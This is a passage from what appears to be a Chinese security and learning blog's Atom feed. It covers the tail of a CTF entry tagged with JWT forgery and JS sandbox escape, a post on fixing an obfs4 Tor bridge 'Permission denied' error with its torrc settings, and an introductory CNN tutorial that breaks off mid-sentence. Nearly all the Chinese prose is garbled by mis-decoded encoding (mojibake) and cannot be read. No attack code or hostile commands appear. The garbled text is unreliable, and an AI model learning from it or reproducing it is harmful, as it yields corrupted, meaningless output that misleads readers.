      &lt;p&gt;è¿™æ¬¡çš„è™ç¬¦CTFæ²¡æŠ¥ä¸Šåä¹Ÿæ˜¯å¯æƒœï¼Œä¸è¿‡æœ‹å‹å‘æ¥é¢˜ç›®é“¾æ¥ï¼Œæ‰“å¼€ä¸€çœ‹æ˜¯JSçš„é¢˜ï¼Œè¿˜å¥½æ²¡æŠ¥åâ€¦ğŸ˜ JSå’±å•¥ä¹Ÿä¸ä¼šå‘€ï¼Œä¸è¿‡å­¦ä¹ è¿˜æ˜¯è¦å­¦ä¹ çš„ã€‚
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="èµ›é¢˜å¤ç°" scheme="http://ggb0n.cool/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="JWTä¼ªé€ " scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="JavaScript" scheme="http://ggb0n.cool/tags/JavaScript/"/>
    
      <category term="NodeJS" scheme="http://ggb0n.cool/tags/NodeJS/"/>
    
      <category term="JSæ²™ç®±é€ƒé€¸" scheme="http://ggb0n.cool/tags/JS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
      <category term="JSæ¨¡æ¿å­—ç¬¦ä¸²" scheme="http://ggb0n.cool/tags/JS%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
      <category term="JSå¼±ç±»å‹" scheme="http://ggb0n.cool/tags/JS%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†</title>
    <link href="http://ggb0n.cool/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>http://ggb0n.cool/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/</id>
    <published>2020-04-16T01:52:29.000Z</published>
    <updated>2020-04-22T00:15:11.526Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©çš„é—®é¢˜ä¸Šåˆåˆšè§£å†³ï¼Œç»“æœåˆæœ‰æ–°é—®é¢˜â€¦ ä¸è¿‡è¿™é—®é¢˜ç½‘ä¸Šå¥½åƒè¿˜æœ‰äººé—®äº†ï¼Œä½†æ˜¯è²Œä¼¼æ²¡ä»€ä¹ˆè§£å†³æ–¹æ¡ˆï¼Œè¿˜æœ‰äººè¯´æ˜¯obfs4çš„ä¸€ä¸ªbugï¼Œç€å®è®©æˆ‘æŠ“ç‹‚ï¼Œæ„Ÿè§‰æ˜¯å…¨ç½‘ç¬¬ä¸€ä¸ªè§£å†³çš„äººï¼Œèµ·ç åº”è¯¥æ˜¯ç¬¬ä¸€ç¯‡è§£å†³çš„æ–‡ç« ã€‚æƒ¬æ„~ğŸ¤£<a id="more"></a></p><h3 id="æŠ¥é”™é—®é¢˜"><a href="#æŠ¥é”™é—®é¢˜" class="headerlink" title="æŠ¥é”™é—®é¢˜"></a>æŠ¥é”™é—®é¢˜</h3><p>ä¸ŠåˆæˆåŠŸç¼–è¯‘obfs4é¡¹ç›®ä¹‹åï¼Œéšåå°±å¯¹<code>/etc/tor/torrc</code>æ–‡ä»¶åšäº†å¦‚ä¸‹çš„é…ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Log notice file &#x2F;var&#x2F;log&#x2F;tor&#x2F;notices.log</span><br><span class="line">RunAsDaemon 1</span><br><span class="line">ORPort 44443 #æ³¨æ„è¿™ä¸ªç«¯å£å®˜æ–¹æä¾›é…ç½®æ˜¯443ï¼Œä¸è¿‡443å¯èƒ½è¢«å ç”¨å¯¼è‡´torå¯åŠ¨å¤±è´¥ï¼Œæ”¹ä¸€ä¸‹å°±è¡Œ</span><br><span class="line">Exitpolicy reject *:*</span><br><span class="line">BridgeRelay 1</span><br><span class="line">ServerTransportPlugin obfs4 exec &#x2F;usr&#x2F;local&#x2F;bin&#x2F;obfs4proxy</span><br><span class="line">ExtORPort auto</span><br><span class="line">PublishServerDescriptor 0</span><br></pre></td></tr></table></figure><p>ç„¶åé‡å¯toræœåŠ¡ï¼š<code>service tor restart</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹torçš„è¿è¡ŒçŠ¶æ€æ˜¯æ²¡é—®é¢˜ï¼Œå—¯ï¼Œæ”¾å¿ƒäº†ã€‚</p><p>ç„¶å<code>tail -F /var/log/tor/notices.log</code>ï¼ŒåŸæœ¬ä»¥ä¸ºæ²¡é—®é¢˜ï¼Œä½†æ˜¯å›æ˜¾ç»“æœå¦‚ä¸‹ï¼š<br><img src="http://ggb0n.cool/images/obfs4-1.png" alt=""></p><p>æ²¡é”™ï¼ŒæŠ¥äº†å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[warn] Could not launch managed proxy executable at &#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;obfs4proxy&#39; (&#39;Permission denied&#39;).</span><br></pre></td></tr></table></figure><p>è€ŒæˆåŠŸçš„å›æ˜¾å‘¢ï¼Ÿ<br><img src="http://ggb0n.cool/images/obfs4-2.png" alt=""></p><p>æ²¡é”™ï¼Œæ˜¯ä¸Šé¢è¿™ç§æƒ…å†µ</p><p>ç„¶åå°±ç–¯ç‹‚ç§‘å­¦ä¸Šç½‘æ‰¾è§£å†³æ–¹å¼ï¼Œè¯´æ˜¯ä»€ä¹ˆè¦ä»¥æ‰˜ç®¡çš„æ–¹å¼è¿è¡Œï¼Œä½†æ˜¯å°±æ˜¯ä¸€ç›´è§£å†³ä¸äº†â€¦</p><h3 id="å‘ç°çŒ«è…»"><a href="#å‘ç°çŒ«è…»" class="headerlink" title="å‘ç°çŒ«è…»"></a>å‘ç°çŒ«è…»</h3><p>æ˜¯åœ¨å¤šæ¬¡å°è¯•ä¸­ï¼Œå‘ç°äº†ç–‘ä¼¼é—®é¢˜çš„<br>å¤šæ¬¡restartæœåŠ¡ï¼Œå‘ç°toræœåŠ¡éƒ½æ­£å¸¸ï¼Œå½“æ—¶å½“ç»ˆç«¯ç›´æ¥é”®å…¥<code>tor</code>å»è¿è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿ<br><img src="http://ggb0n.cool/images/obfs4-3.png" alt=""></p><p>ä¸çŸ¥é“æ˜¯ç«¯å£å ç”¨è¿˜æ˜¯è¿›ç¨‹æ²¡è¢«æ€æ­»ï¼Œä½†æ˜¯è¿™åº”è¯¥å°±æ˜¯é—®é¢˜æ‰€åœ¨äº†ï¼Œå› ä¸ºç»ˆç«¯é”®å…¥<code>tor</code>å…¶å®æ˜¯æ‰§è¡Œtorè¿™ä¸ªç¨‹åºï¼Œè€Œ<code>restart</code>æ˜¯å¯¹toræœåŠ¡çš„æ“ä½œï¼ŒæœåŠ¡æˆåŠŸè¿è¡Œä¸ä»£è¡¨ç€torå¯åŠ¨äº†å‘€ï¼Œtorä¸å¯åŠ¨ï¼Œé‚£å°±ä¸æ˜¯ä»¥æ‰˜ç®¡æ–¹å¼å»è¿è¡Œobfs4proxyäº†å‘€ï¼Œæ‰€æœ‰è¿™å°±æ˜¯é—®é¢˜ï¼</p><h3 id="è§£å†³é—®é¢˜"><a href="#è§£å†³é—®é¢˜" class="headerlink" title="è§£å†³é—®é¢˜"></a>è§£å†³é—®é¢˜</h3><p>ç”±äºæœ€åˆæ˜¯yumå®‰è£…çš„torï¼Œå°è¯•é‡è£…æ— æœï¼Œä¾¿é€‰æ‹©äº†è‡ªå·±ä¸‹è½½æºç ç¼–è¯‘ã€‚</p><p>ç¼–è¯‘ã€å®‰è£…å®Œæˆä¹‹åï¼Œå¯¹<code>/usr/local/etc/tor</code>ä¸‹çš„<code>torrc</code>è¿›è¡Œå‰é¢æåˆ°çš„é…ç½®ï¼Œç„¶åæ‰§è¡Œå¯æ‰§è¡Œç¨‹åºï¼Œåœ¨<code>/usr/local/bin</code>ä¸­ã€‚</p><p>ä»¥å‘½ä»¤<code>./tor;tail -F /var/log/tor/notices.log</code>åŒæ—¶å¯åŠ¨torå’Œç½‘æ¡¥ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://ggb0n.cool/images/obfs4-4.png" alt=""></p><p>good! æˆåŠŸè§£å†³ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ˜¨å¤©çš„é—®é¢˜ä¸Šåˆåˆšè§£å†³ï¼Œç»“æœåˆæœ‰æ–°é—®é¢˜â€¦ ä¸è¿‡è¿™é—®é¢˜ç½‘ä¸Šå¥½åƒè¿˜æœ‰äººé—®äº†ï¼Œä½†æ˜¯è²Œä¼¼æ²¡ä»€ä¹ˆè§£å†³æ–¹æ¡ˆï¼Œè¿˜æœ‰äººè¯´æ˜¯obfs4çš„ä¸€ä¸ªbugï¼Œç€å®è®©æˆ‘æŠ“ç‹‚ï¼Œæ„Ÿè§‰æ˜¯å…¨ç½‘ç¬¬ä¸€ä¸ªè§£å†³çš„äººï¼Œèµ·ç åº”è¯¥æ˜¯ç¬¬ä¸€ç¯‡è§£å†³çš„æ–‡ç« ã€‚æƒ¬æ„~ğŸ¤£
    
    </summary>
    
    
      <category term="çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ " scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="obfs4ç½‘æ¡¥æ­å»º" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="Tor" scheme="http://ggb0n.cool/tags/Tor/"/>
    
      <category term="obfs4ç½‘æ¡¥" scheme="http://ggb0n.cool/tags/obfs4%E7%BD%91%E6%A1%A5/"/>
    
  </entry>
  
  <entry>
    <title>å·ç§¯ç¥ç»ç½‘ç»œCNNå…¥é—¨</title>
    <link href="http://ggb0n.cool/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://ggb0n.cool/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-04-08T16:16:23.000Z</published>
    <updated>2020-05-04T01:39:38.666Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¯¹<code>å·ç§¯ç¥ç»ç½‘ç»œ</code>ï¼ˆ<code>CNN</code>ï¼‰çš„å­¦ä¹ ï¼Œè¿™æ˜¯åœ¨æœºå™¨å­¦ä¹ ï¼Œå…·ä½“æ¥è¯´æ˜¯æ·±åº¦å­¦ä¹ ä¸­çš„ç¬¬ä¸€æ­¥ï¼Œè®¤çœŸå­¦ä¹ ã€å¥½å¥½è®°å½•ã€‚</p><p>CNNæ›¾ç»è¢«<code>AlphaGo</code>çš„å¼€å‘å›¢é˜Ÿç”¨äºå…¶å¼€å‘ï¼Œä»è€Œä¹Ÿä¸€åº¦å¼•èµ·ä¸šå†…äººå£«çš„é’çï¼Œä¸è¿‡æœ‰äº›æ—¶å€™ä¼šå‡ºç°å¯¹CNNçš„ç›²ç›®å´‡æ‹œï¼Œæ¯”å¦‚ä½ é¢è¯•çš„æ—¶å€™ï¼Œå¯¹é¢å¯èƒ½ä¼šé—®ï¼šä½ åšè¿‡æœºå™¨å­¦ä¹ å—ï¼Ÿä½ ä¸ºä»€ä¹ˆæ²¡æœ‰é‡‡ç”¨CNNç®—æ³•å‘¢ï¼Ÿ<a id="more"></a><br>è¿™å¯èƒ½è®©äººæ— æ³•å›ç­”ï¼Œå…¶å®CNNè™½ç„¶ç›¸å¯¹äº<code>æ·±åº¦ç¥ç»ç½‘ç»œ</code>ï¼ˆ<code>DNN</code>ï¼‰æ›´åŠ ç®€ä¾¿ï¼Œæ•ˆèƒ½ä¹Ÿå¾ˆå¥½ï¼Œä¸è¿‡CNNåªæ˜¯ç”¨äºå›¾åƒå¤„ç†ï¼Œæˆ–è€…å…·æœ‰ä¸å›¾åƒå¤„ç†è¦ç´ ç›¸å½“çš„ä¸€äº›é—®é¢˜çš„å¤„ç†ä¸­ï¼Œå°±æ¯”å¦‚<code>AlphaGo</code>çš„ä¸‹å›´æ£‹ï¼Œå…¶å®å°±ç›¸å½“äºæŠŠæ£‹ç›˜å½“åšäº†å›¾åƒæ¥è¿›è¡Œå¤„ç†ï¼Œå› æ­¤ï¼Œå¦‚æœä½ éœ€è¦åˆ©ç”¨ç¥ç»ç½‘ç»œå®ç°æŸäº›é¡¹ç›®ï¼Œä¸€å®šè¦è€ƒè™‘å¥½å®ƒå…·å¤‡ä¸å›¾åƒå¤„ç†ç›¸å½“çš„è¦ç´ æ²¡æœ‰ã€‚</p><p>è¿™é‡Œæä¾›ä¸€ä¸ªæ¯”è¾ƒå¥½çš„å­¦ä¹ è§†é¢‘ï¼Œæ˜¯<a href="https://www.bilibili.com/video/BV1hp411d7ij/?spm_id_from=333.788.videocard.0">æå®æ¯…è€å¸ˆçš„æ•™å­¦è§†é¢‘</a>ã€‚å¥½äº†ï¼Œä¸‹é¢è¿›å…¥å­¦ä¹ è®°å½•äº†ã€‚</p><h3 id="å·ç§¯ç¥ç»ç½‘ç»œæ¦‚è¿°"><a href="#å·ç§¯ç¥ç»ç½‘ç»œæ¦‚è¿°" class="headerlink" title="å·ç§¯ç¥ç»ç½‘ç»œæ¦‚è¿°"></a>å·ç§¯ç¥ç»ç½‘ç»œæ¦‚è¿°</h3><p>å·ç§¯ç¥ç»ç½‘ç»œï¼Œæ˜¯æ·±åº¦å­¦ä¹ ç®—æ³•åº”ç”¨æœ€æˆåŠŸçš„é¢†åŸŸä¹‹ä¸€ï¼Œå·ç§¯ç¥ç»ç½‘ç»œåŒ…æ‹¬ä¸€ç»´å·ç§¯ç¥ç»ç½‘ç»œï¼ŒäºŒç»´å·ç§¯ç¥ç»ç½‘ç»œä»¥åŠä¸‰ç»´å·ç§¯ç¥ç»ç½‘ç»œã€‚ä¸€ç»´å·ç§¯ç¥ç»ç½‘ç»œä¸»è¦ç”¨äº<code>åºåˆ—ç±»</code>çš„æ•°æ®å¤„ç†ï¼ŒäºŒç»´å·ç§¯ç¥ç»ç½‘ç»œå¸¸åº”ç”¨äº<code>å›¾åƒç±»æ–‡æœ¬</code>çš„è¯†åˆ«ï¼Œä¸‰ç»´å·ç§¯ç¥ç»ç½‘ç»œä¸»è¦åº”ç”¨äº<code>åŒ»å­¦å›¾åƒ</code>ä»¥åŠ<code>è§†é¢‘ç±»</code>æ•°æ®è¯†åˆ«ã€‚</p><p>å…¶ç»“æ„æ¨¡å‹å¦‚ä¸‹ï¼š<br><img src="http://ggb0n.cool/images/moxing1.png" alt=""></p><p>ä¸å¸¸è§„ç¥ç»ç½‘ç»œä¸åŒï¼Œå·ç§¯ç¥ç»ç½‘ç»œçš„å„å±‚ä¸­çš„ç¥ç»å…ƒæ˜¯<code>3ç»´</code>æ’åˆ—çš„ï¼š<code>å®½åº¦</code>ã€<code>é«˜åº¦</code>å’Œ<code>æ·±åº¦</code>ã€‚å…¶ä¸­çš„å®½åº¦å’Œé«˜åº¦æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œå› ä¸ºæœ¬èº«å·ç§¯å°±æ˜¯ä¸€ä¸ªäºŒç»´æ¨¡æ¿ï¼Œä½†æ˜¯åœ¨å·ç§¯ç¥ç»ç½‘ç»œä¸­çš„æ·±åº¦æŒ‡çš„æ˜¯<strong>æ¿€æ´»æ•°æ®ä½“</strong>çš„ç¬¬ä¸‰ä¸ªç»´åº¦ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç½‘ç»œçš„æ·±åº¦ï¼Œæ•´ä¸ªç½‘ç»œçš„æ·±åº¦æŒ‡çš„æ˜¯ç½‘ç»œçš„å±‚æ•°ã€‚</p><h3 id="å·ç§¯ç¥ç»ç½‘ç»œå±‚æ¬¡"><a href="#å·ç§¯ç¥ç»ç½‘ç»œå±‚æ¬¡" class="headerlink" title="å·ç§¯ç¥ç»ç½‘ç»œå±‚æ¬¡"></a>å·ç§¯ç¥ç»ç½‘ç»œå±‚æ¬¡</h3><p>å·ç§¯ç¥ç»ç½‘ç»œä¸»è¦ç”±è¿™å‡ ç±»å±‚æ„æˆï¼š<code>è¾“å…¥å±‚</code>ã€<code>å·ç§¯å±‚</code>ï¼Œ<code>ReLUå±‚</code>ã€<code>æ± åŒ–ï¼ˆPoolingï¼‰å±‚</code>(æœ‰æ—¶ä¹Ÿç§°é™é‡‡æ ·ã€ä¸‹é‡‡æ ·å±‚)å’Œ<code>å…¨è¿æ¥å±‚</code>ï¼ˆå…¨è¿æ¥å±‚å’Œå¸¸è§„ç¥ç»ç½‘ç»œä¸­çš„ä¸€æ ·ï¼‰ã€‚é€šè¿‡å°†è¿™äº›å±‚å åŠ èµ·æ¥ï¼Œå°±å¯ä»¥æ„å»ºä¸€ä¸ªå®Œæ•´çš„å·ç§¯ç¥ç»ç½‘ç»œï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/moxing2.png" alt=""></p><p>å„å±‚çš„ä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li>è¾“å…¥å±‚ï¼šç”¨äºæ•°æ®çš„è¾“å…¥ï¼›</li><li>å·ç§¯å±‚ï¼šä½¿ç”¨å·ç§¯æ ¸è¿›è¡Œç‰¹å¾æå–å’Œç‰¹å¾æ˜ å°„ï¼›</li><li>æ± åŒ–å±‚ï¼šè¿›è¡Œä¸‹é‡‡æ ·ï¼Œå¯¹ç‰¹å¾å›¾ç¨€ç–å¤„ç†ï¼Œå‡å°‘æ•°æ®è¿ç®—é‡ï¼›</li><li>æ¿€åŠ±å±‚ï¼šç”±äºå·ç§¯ä¹Ÿæ˜¯ä¸€ç§çº¿æ€§è¿ç®—ï¼Œå› æ­¤éœ€è¦å¢åŠ éçº¿æ€§æ˜ å°„ï¼›</li><li>å…¨è¿æ¥å±‚ï¼šé€šå¸¸åœ¨CNNçš„å°¾éƒ¨è¿›è¡Œé‡æ–°æ‹Ÿåˆï¼Œå‡å°‘ç‰¹å¾ä¿¡æ¯çš„æŸå¤±ã€‚</li></ul><h4 id="è¾“å…¥å±‚"><a href="#è¾“å…¥å±‚" class="headerlink" title="è¾“å…¥å±‚"></a>è¾“å…¥å±‚</h4><p>è¯¥å±‚é™¤äº†è¾“å…¥æ•°æ®ï¼Œè¿˜ä¼šå¯¹æ•°æ®è¿›è¡Œä¸€äº›é¢„å¤„ç†ï¼ŒåŒ…æ‹¬ï¼š<code>å»å‡å€¼</code>ã€<code>å½’ä¸€åŒ–</code>ã€<code>PCA</code>ã€<code>ç™½åŒ–</code></p><blockquote><p>PCAï¼šæ˜¯æŒ‡é€šè¿‡æŠ›å¼ƒæºå¸¦ä¿¡æ¯é‡è¾ƒå°‘çš„ç»´åº¦ï¼Œä¿ç•™ä¸»è¦çš„ç‰¹å¾ä¿¡Jè‡ªï¼Œæ¥å¯¹æ•°æ®è¿›è¡Œé™ç»´å¤„ç†ï¼Œæ€è·¯ä¸Šæ˜¯ä½¿ç”¨å°‘æ•°å‡ ä¸ªæœ‰ä»£è¡¨æ€§ã€äº’ä¸ç›¸å…³çš„ç‰¹å¾æ¥ä»£æ›¿åŸå…ˆçš„..ké‡çš„ã€å­˜åœ¨ä¸€å®šç›¸å…³æ€§çš„ç‰¹å¾ï¼Œä»è€ŒåŠ é€Ÿæœºå™¨å­¦ä¹ è¿›ç¨‹ã€‚PCAå¯ç”¨äºç‰¹å¾æå–ï¼Œæ•°æ®å‹ç¼©ï¼Œå»å™ªå£°ï¼Œé™ç»´ç­‰æ“ä½œã€‚</p></blockquote><blockquote><p>ç™½åŒ–ï¼šç›®çš„æ˜¯å»æ‰æ•°æ®ä¹‹é—´çš„ç›¸å…³è”åº¦å’Œä»¤æ–¹å·®å‡ä¸€åŒ–ï¼Œç”±äºå›¾åƒä¸­ç›¸é‚»åƒç´ ä¹‹é—´å…·æœ‰å¾ˆå¼ºçš„ç›¸å…³æ€§ï¼Œæ‰€ä»¥ç”¨äºè®­ç»ƒæ—¶å¾ˆå¤šè¾“å…¥æ˜¯å†—ä½™çš„ã€‚è¿™æ—¶å€™å»ç›¸å…³çš„æ“ä½œå°±å¯ä»¥é‡‡ç”¨è‡ªåŒ–æ“ä½œï¼Œä»è€Œä½¿å¾—ï¼š</p><ul><li>1ã€å‡å°‘ç‰¹å¾ä¹‹é—´çš„ç›¸å…³æ€§</li><li>2ã€ç‰¹å¾å…·æœ‰ç›¸åŒçš„æ–¹å·®</li></ul></blockquote><h4 id="å·ç§¯å±‚"><a href="#å·ç§¯å±‚" class="headerlink" title="å·ç§¯å±‚"></a>å·ç§¯å±‚</h4><p>å·ç§¯å±‚æ˜¯æ„å»ºå·ç§¯ç¥ç»ç½‘ç»œçš„<strong>æ ¸å¿ƒå±‚</strong>ï¼Œå› æ­¤è¯¥å±‚ä¹Ÿæ˜¯å­¦ä¹ çš„é‡ç‚¹ã€‚å®ƒäº§ç”Ÿäº†ç½‘ç»œä¸­å¤§éƒ¨åˆ†çš„<strong>è®¡ç®—é‡</strong>ï¼Œæ³¨æ„æ˜¯è®¡ç®—é‡è€Œä¸æ˜¯å‚æ•°é‡ã€‚</p><p><strong>å·ç§¯å±‚çš„ä½œç”¨</strong></p><p>ä¸»è¦æœ‰ä¸‰ç‚¹ï¼š</p><ul><li><p>æ»¤æ³¢å™¨çš„ä½œç”¨æˆ–è€…è¯´æ˜¯å·ç§¯çš„ä½œç”¨</p><blockquote><p>å·ç§¯å±‚çš„å‚æ•°æ˜¯æœ‰ä¸€äº›å¯å­¦ä¹ çš„<code>æ»¤æ³¢å™¨</code>ï¼ˆ<code>Filter</code>ï¼‰é›†åˆæ„æˆçš„ã€‚æ¯ä¸ªæ»¤æ³¢å™¨åœ¨ç©ºé—´ä¸Šï¼ˆå®½åº¦å’Œé«˜åº¦ï¼‰éƒ½æ¯”è¾ƒå°ï¼Œ<strong>ä½†æ˜¯æ·±åº¦å’Œè¾“å…¥æ•°æ®ä¸€è‡´</strong>ã€‚<br>ç›´è§‚åœ°æ¥è¯´ï¼Œç½‘ç»œä¼šè®©æ»¤æ³¢å™¨å­¦ä¹ åˆ°å½“å®ƒçœ‹åˆ°æŸäº›ç±»å‹çš„è§†è§‰ç‰¹å¾æ—¶å°±æ¿€æ´»ï¼Œå…·ä½“çš„è§†è§‰ç‰¹å¾å¯èƒ½æ˜¯æŸäº›æ–¹ä½ä¸Šçš„è¾¹ç•Œï¼Œæˆ–è€…åœ¨ç¬¬ä¸€å±‚ä¸ŠæŸäº›é¢œè‰²çš„æ–‘ç‚¹ï¼Œç”šè‡³å¯ä»¥æ˜¯ç½‘ç»œæ›´é«˜å±‚ä¸Šçš„èœ‚å·¢çŠ¶ã€è½¦è½®çŠ¶çš„å›¾æ¡ˆã€‚</p></blockquote></li><li><p>å¯ä»¥çœ‹åšç¥ç»å…ƒçš„ä¸€ä¸ªè¾“å‡º</p><blockquote><p>ç¥ç»å…ƒåªè§‚å¯Ÿè¾“å…¥æ•°æ®ä¸­çš„ä¸€å°éƒ¨åˆ†ï¼Œå¹¶ä¸”å’Œç©ºé—´ä¸Šå·¦å³ä¸¤è¾¹çš„æ‰€æœ‰ç¥ç»å…ƒå…±äº«å‚æ•°ï¼ˆå› ä¸ºè¿™äº›æ•°å­—éƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªæ»¤æ³¢å™¨å¾—åˆ°çš„ç»“æœï¼‰ã€‚</p></blockquote></li><li><p>å‡å°‘å‚æ•°æ•°é‡</p><blockquote><p>è¿™ä¸ªç”±äºå·ç§¯å…·æœ‰â€œ<code>æƒå€¼å…±äº«</code>â€è¿™æ ·çš„ç‰¹æ€§ï¼Œå¯ä»¥é™ä½å‚æ•°æ•°é‡ï¼Œè¾¾åˆ°é™ä½è®¡ç®—å¼€é”€ï¼Œé˜²æ­¢ç”±äºå‚æ•°è¿‡å¤šè€Œé€ æˆè¿‡æ‹Ÿåˆã€‚</p></blockquote></li></ul><p><strong>æ„Ÿå—é‡</strong></p><p>åœ¨å¤„ç†å›¾åƒè¿™æ ·çš„é«˜ç»´åº¦è¾“å…¥æ—¶ï¼Œè®©æ¯ä¸ªç¥ç»å…ƒéƒ½ä¸å‰ä¸€å±‚ä¸­çš„æ‰€æœ‰ç¥ç»å…ƒè¿›è¡Œå…¨è¿æ¥æ˜¯ä¸ç°å®çš„ã€‚è€Œæ˜¯è®©æ¯ä¸ªç¥ç»å…ƒåªä¸è¾“å…¥æ•°æ®çš„ä¸€ä¸ªå±€éƒ¨åŒºåŸŸè¿æ¥ï¼Œè¯¥è¿æ¥çš„ç©ºé—´å¤§å°å«åšç¥ç»å…ƒçš„<code>æ„Ÿå—é‡ï¼ˆreceptive fieldï¼‰</code>ï¼Œå®ƒçš„å°ºå¯¸æ˜¯ä¸€ä¸ªè¶…å‚æ•°ï¼ˆæ»¤æ³¢å™¨çš„ç©ºé—´å°ºå¯¸ï¼‰ã€‚æ³¨æ„ï¼šåœ¨æ·±åº¦æ–¹å‘ä¸Šï¼Œè¿™ä¸ªè¿æ¥çš„å¤§å°æ€»æ˜¯å’Œè¾“å…¥çš„æ·±åº¦ç›¸ç­‰ã€‚</p><p><strong>ç¥ç»å…ƒçš„ç©ºé—´æ’åˆ—</strong></p><p>æ„Ÿå—é‡è®²è§£äº†å·ç§¯å±‚ä¸­æ¯ä¸ªç¥ç»å…ƒä¸<strong>è¾“å…¥æ•°æ®ä½“</strong>ä¹‹é—´çš„è¿æ¥æ–¹å¼ï¼Œä½†æ˜¯å°šæœªè®¨è®ºè¾“å‡ºæ•°æ®ä½“ä¸­ç¥ç»å…ƒçš„æ•°é‡ï¼Œä»¥åŠå®ƒä»¬çš„æ’åˆ—æ–¹å¼ã€‚3ä¸ªè¶…å‚æ•°æ§åˆ¶ç€è¾“å‡ºæ•°æ®ä½“çš„å°ºå¯¸ï¼š<code>æ·±åº¦</code>ï¼ˆ<code>depth</code>ï¼‰ï¼Œ<code>æ­¥é•¿</code>ï¼ˆ<code>stride</code>ï¼‰å’Œ<code>é›¶å¡«å……</code>ï¼ˆ<code>zero-padding</code>ï¼‰ï¼š</p><ul><li>æ·±åº¦ï¼šä¸€ä¸ªè¶…å‚æ•°ï¼Œå’Œä½¿ç”¨çš„æ»¤æ³¢å™¨çš„æ•°é‡ä¸€è‡´ï¼Œè€Œæ¯ä¸ªæ»¤æ³¢å™¨åœ¨è¾“å…¥æ•°æ®ä¸­å¯»æ‰¾ä¸€äº›ä¸åŒçš„ä¸œè¥¿ï¼Œå³å›¾åƒçš„æŸäº›ç‰¹å¾ã€‚</li><li>æ­¥é•¿ï¼šåœ¨æ»‘åŠ¨æ»¤æ³¢å™¨çš„æ—¶å€™ï¼Œå¿…é¡»æŒ‡å®šæ­¥é•¿ã€‚å½“æ­¥é•¿ä¸º1ï¼Œæ»¤æ³¢å™¨æ¯æ¬¡ç§»åŠ¨1ä¸ªåƒç´ ï¼›å½“æ­¥é•¿ä¸º2ï¼Œæ»¤æ³¢å™¨æ»‘åŠ¨æ—¶æ¯æ¬¡ç§»åŠ¨2ä¸ªåƒç´ ï¼Œä¾æ¬¡ç±»æ¨ã€‚è¿™ä¸ªæ“ä½œä¼šè®©è¾“å‡ºæ•°æ®ä½“åœ¨ç©ºé—´ä¸Šå˜å°ã€‚</li><li>é›¶å¡«å……ï¼šæœ‰æ—¶å€™å°†è¾“å…¥æ•°æ®ä½“ç”¨<code>0</code>åœ¨è¾¹ç¼˜å¤„è¿›è¡Œå¡«å……æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚é›¶å¡«å……çš„å°ºå¯¸æ˜¯ä¸€ä¸ªè¶…å‚æ•°ã€‚å®ƒå…·æœ‰ä¸€ä¸ªè‰¯å¥½æ€§è´¨ï¼Œå³å¯ä»¥æ§åˆ¶è¾“å‡ºæ•°æ®ä½“çš„ç©ºé—´å°ºå¯¸ï¼ˆæœ€å¸¸ç”¨çš„æ˜¯ç”¨æ¥ä¿æŒè¾“å…¥æ•°æ®ä½“åœ¨ç©ºé—´ä¸Šçš„å°ºå¯¸ï¼Œä½¿å¾—è¾“å…¥å’Œè¾“å‡ºçš„å®½é«˜éƒ½ç›¸ç­‰ï¼‰ã€‚</li></ul><p>è¾“å‡ºæ•°æ®ä½“åœ¨ç©ºé—´ä¸Šçš„å°ºå¯¸ 